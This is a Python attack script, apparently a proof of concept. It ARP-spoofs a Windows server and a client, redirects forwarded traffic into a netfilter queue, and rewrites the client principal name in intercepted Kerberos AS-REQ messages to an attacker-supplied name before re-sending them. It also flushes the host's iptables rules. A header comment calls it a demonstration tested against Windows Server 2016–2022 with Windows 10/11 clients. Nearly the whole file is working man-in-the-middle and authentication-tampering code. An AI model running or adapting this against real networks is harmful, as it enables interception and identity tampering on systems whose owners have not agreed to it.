from netfilterqueue import NetfilterQueue
import scapy.all as scapy
import os
import struct
import sys

#PARAMS: SERVER_IP, TARGET_IP, NAME, INTERFACE
#Caution this script was for demonstration only this is not meant for production testing purposes
#Tested devices were WS2016,2019,2022 with W10 clients and W11 client

os.system("echo '1' > /proc/sys/net/ipv4/ip_forward")
os.system("iptables -F")
os.system("iptables -F -t nat")
os.system("iptables -A FORWARD -j NFQUEUE --queue-num 0")
os.system("arpspoof -i " + sys.argv[4]  + " " + sys.argv[1] + " -t " + sys.argv[2] + "> /dev/null 2>&1 &")
os.system("arpspoof -i " + sys.argv[4]  + " " + sys.argv[2] + " -t " + sys.argv[1] + "> /dev/null 2>&1 &")

byte_skip = 4
over_head_skip = 7

auth_as = sys.argv[3]
pcap_file_path = "capture.pcap"

kerberos_message_types = {
    10: "AS-REQ",
    11: "AS-REP",
    12: "TGS-REQ",
    13: "TGS-REP",
    14: "AP-REQ",
    15: "AP-REP",
    20: "KRB-SAFE",
    21: "KRB-PRIV",
    22: "KRB-CRED",
    30: "KRB-ERROR",
}

cname_name_types = {
    0: "KRB_NT_UNKNOWN",          # Name type not known
    1: "KRB_NT_PRINCIPAL",        # Just the name of the principal as in DCE, or for users
    2: "KRB_NT_SRV_INST",         # Service and other unique instance (krbtgt)
    3: "KRB_NT_SRV_HST",          # Service with host name as instance (telnet, rcommands)
    4: "KRB_NT_SRV_XHST",         # Service with host as remaining components
    5: "KRB_NT_UID",              # Unique ID
    6: "KRB_NT_X500_PRINCIPAL",   # Encoded X.509 Distinguished name [RFC2253]
    7: "KRB_NT_SMTP_NAME",        # Name in form of SMTP email name (e.g., user@example.com)
    10: "KRB_NT_ENTERPRISE",      # Enterprise name; may be mapped to principal name
}

def is_kerberos(raw_data): #function which tests if this message is a keberos AS message
    if len(raw_data) < 9:
        return False, 0  # Not enough data to be a Kerberos message

    if raw_data[0:2] != b'\x00\x00':
        return False, 0  # Usually not a Kerberos message

    if raw_data[4:6] == b'\x6a\x82':
        return True, 1  # Type 2 message
    elif raw_data[4:6] == b'\x6a\x81':
        return True, 2  # Type 1 message
    else:
        return False, 0 



def get_record_lenght(byte_data): #Checking record lenght so i know how long the message is
    if len(byte_data) < 4:
        raise ValueError("Byte data must be at least 4 bytes long")
    
    length = struct.unpack('!I', byte_data[:4])[0]

    length &= 0x7FFFFFFF

    return length

def edit_packet(packet): # main function which is called when data is recieved
    ip_packet = scapy.IP(packet.get_payload())
    ip_src = ip_packet[scapy.IP].src
    ip_dst = ip_packet[scapy.IP].dst
    if ip_src == sys.argv[1]: # any traffic from the server doesn't need to be inspected or modified
        packet.accept() 
        return  
    if ip_packet.haslayer(scapy.Raw) and ip_packet.haslayer(scapy.TCP) and ip_src == sys.argv[2]: 
        raw_data = ip_packet[scapy.Raw].load
        check, msg_t = is_kerberos(raw_data)
        if check:
            packet.drop()
            if msg_t == 1:
                # there is a better way to do this by reading the lenght byte however that was due to time constrains cut
                print(20* "-")
                print("Kerberos message with Authentication")
                record_lenght = get_record_lenght(raw_data[:4])
                pvno_offset = 4 + 4 + 8 #record lenght + identitifaction + specific offset
                print("Protocol version: ", raw_data[pvno_offset])
                krb_msg_type_offset = pvno_offset + byte_skip + 1 #seems the padding is always the same hence byteskip
                print("Message Type: ", kerberos_message_types.get(raw_data[krb_msg_type_offset], "Unknown"))
                req_body_offset = krb_msg_type_offset + byte_skip + 97 + 3 #Described + Described + PA data taken from wireshark intercepted message + extra pad
                req_body_header = krb_msg_type_offset + byte_skip + 97 
                padding_offset = req_body_offset + 7 + 1# specific skip again           
                cname_offset = padding_offset + 4
                name_type = cname_offset + 6 + 2 + 1
                detected_type = cname_name_types.get(raw_data[name_type])
                if(detected_type == None): #for admin the calculated offset is different since it uses a different hash encryption type
                    req_body_offset = krb_msg_type_offset + byte_skip + 93 + 3 #Described + Described + PA data taken from wireshark intercepted message + extra pad
                    req_body_header = krb_msg_type_offset + byte_skip + 93
                    padding_offset = req_body_offset + 7 + 1# specific skip again            
                    cname_offset = padding_offset + 4
                    name_type = cname_offset + 6 + 2 + 1
                    detected_type = cname_name_types.get(raw_data[name_type])
                print("Name Type: ", detected_type)
                cname_string_offset = name_type + 4
                string_lenght_offset = cname_string_offset + 2 #1B before
                string_lenght = raw_data[string_lenght_offset]
                principal_name = raw_data[string_lenght_offset + 1: string_lenght_offset + string_lenght + 1].decode('ascii')
                print("Device authenticating as: ", principal_name)
                
                #edit the message will auth as auth_as
                new_len = len(auth_as) - string_lenght
                #what is this magic??
                tmp_holder = raw_data[7] + new_len
                print(raw_data[7])
                raw_data = raw_data[:7] + tmp_holder.to_bytes(1, byteorder='big') + raw_data[8:]
                tmp_holder = raw_data[11] + new_len
                raw_data = raw_data[:11] + tmp_holder.to_bytes(1, byteorder='big') + raw_data[12:]
                tmp_holder = raw_data[req_body_offset+3] + new_len
                raw_data = raw_data[:req_body_offset+3] + tmp_holder.to_bytes(1, byteorder='big') + raw_data[req_body_offset+4:]
                tmp_holder = raw_data[req_body_header+3] + new_len
                raw_data = raw_data[:req_body_header+3] + tmp_holder.to_bytes(1, byteorder='big') + raw_data[req_body_header+4:]
                tmp_holder = raw_data[cname_offset+2] + new_len
                raw_data = raw_data[:cname_offset+2] + tmp_holder.to_bytes(1, byteorder='big') + raw_data[cname_offset+3:]
                tmp_holder = raw_data[cname_offset+4] + new_len
                raw_data = raw_data[:cname_offset+4] + tmp_holder.to_bytes(1, byteorder='big') + raw_data[cname_offset+5:]
                tmp_holder = raw_data[cname_offset+11] + new_len
                raw_data = raw_data[:cname_offset+11] + tmp_holder.to_bytes(1, byteorder='big') + raw_data[cname_offset+12:]
                tmp_holder = raw_data[cname_offset+13] + new_len
                raw_data = raw_data[:cname_offset+13] + tmp_holder.to_bytes(1, byteorder='big') + raw_data[cname_offset+14:]
                raw_data = raw_data[:string_lenght_offset] + len(auth_as).to_bytes(1, byteorder='big') + raw_data[string_lenght_offset+1:]
                raw_data = raw_data[:string_lenght_offset + 1] + auth_as.encode('ascii') + raw_data[string_lenght_offset + string_lenght + 1:]
                new_data_lenght = len(raw_data) - 4
                raw_data = struct.pack('!I', new_data_lenght) + raw_data[4:]      
            elif msg_t == 2:
                print(20* "-")
                print("Kerberos message without Authentication")
                record_lenght = get_record_lenght(raw_data[:4])
                pvno_offset = 4 + 3 + 7 #record lenght + identitifaction + specific offset
                print("Protocol version: ", raw_data[pvno_offset])
                krb_msg_type_offset = pvno_offset + byte_skip + 1 
                print("Message Type: ", kerberos_message_types.get(raw_data[krb_msg_type_offset], "Unknown"))
                req_body_offset = krb_msg_type_offset + byte_skip + 19 + 3 #Described + Described + PA data taken from wireshark intercepted message + extra pad
                req_body_header = krb_msg_type_offset + byte_skip + 19
                padding_offset = req_body_offset + 7 + 1# specific skip again
                cname_offset = padding_offset + 4
                name_type = cname_offset + 6 + 2 + 1
                print("Name Type: ", cname_name_types.get(raw_data[name_type], "Unknown"))
                cname_string_offset = name_type + 4
                string_lenght_offset = cname_string_offset + 2 #1b before
                string_lenght = raw_data[string_lenght_offset]
                principal_name = raw_data[string_lenght_offset + 1: string_lenght_offset + string_lenght + 1].decode('ascii')
                print("Device authenticating as: ", principal_name)

                #edit the message will auth as auth_as
                new_len = len(auth_as) - string_lenght
                
                tmp_holder = raw_data[6] + new_len
                raw_data = raw_data[:6] + tmp_holder.to_bytes(1, byteorder='big') + raw_data[7:]
                tmp_holder = raw_data[9] + new_len
                raw_data = raw_data[:9] + tmp_holder.to_bytes(1, byteorder='big') + raw_data[10:]
                tmp_holder = raw_data[req_body_offset+3] + new_len
                raw_data = raw_data[:req_body_offset+3] + tmp_holder.to_bytes(1, byteorder='big') + raw_data[req_body_offset+4:]
                tmp_holder = raw_data[req_body_header+3] + new_len
                raw_data = raw_data[:req_body_header+3] + tmp_holder.to_bytes(1, byteorder='big') + raw_data[req_body_header+4:]
                tmp_holder = raw_data[cname_offset+2] + new_len
                raw_data = raw_data[:cname_offset+2] + tmp_holder.to_bytes(1, byteorder='big') + raw_data[cname_offset+3:]
                tmp_holder = raw_data[cname_offset+4] + new_len
                raw_data = raw_data[:cname_offset+4] + tmp_holder.to_bytes(1, byteorder='big') + raw_data[cname_offset+5:]
                tmp_holder = raw_data[cname_offset+11] + new_len
                raw_data = raw_data[:cname_offset+11] + tmp_holder.to_bytes(1, byteorder='big') + raw_data[cname_offset+12:]
                tmp_holder = raw_data[cname_offset+13] + new_len
                raw_data = raw_data[:cname_offset+13] + tmp_holder.to_bytes(1, byteorder='big') + raw_data[cname_offset+14:]
                raw_data = raw_data[:string_lenght_offset] + len(auth_as).to_bytes(1, byteorder='big') + raw_data[string_lenght_offset+1:]
                raw_data = raw_data[:string_lenght_offset + 1] + auth_as.encode('ascii') + raw_data[string_lenght_offset + string_lenght + 1:]
                new_data_lenght = len(raw_data) - 4
                raw_data = struct.pack('!I', new_data_lenght) + raw_data[4:]

            #Create a new message with all the data from original message except the kerberos data which is edited
            new_ip_packet = scapy.IP(src=ip_src, dst=ip_dst) / scapy.TCP(sport=ip_packet[scapy.TCP].sport, dport=ip_packet[scapy.TCP].dport, flags=ip_packet[scapy.TCP].flags, seq=ip_packet[scapy.TCP].seq, ack=ip_packet[scapy.TCP].ack) / scapy.Raw(load=raw_data)
            scapy.send(new_ip_packet) #sending packet
            scapy.wrpcap(pcap_file_path, [new_ip_packet]) #saving packet to a pcap for debugging purposes
            return
        else:
            packet.accept()
            return
    else:
        packet.accept()
        return


nf_queue = NetfilterQueue()
nf_queue.bind(0, edit_packet)

try:
    nf_queue.run()
except KeyboardInterrupt:
    os.system("iptables -F")
    os.system("iptables -F -t nat")

nf_queue.unbind()
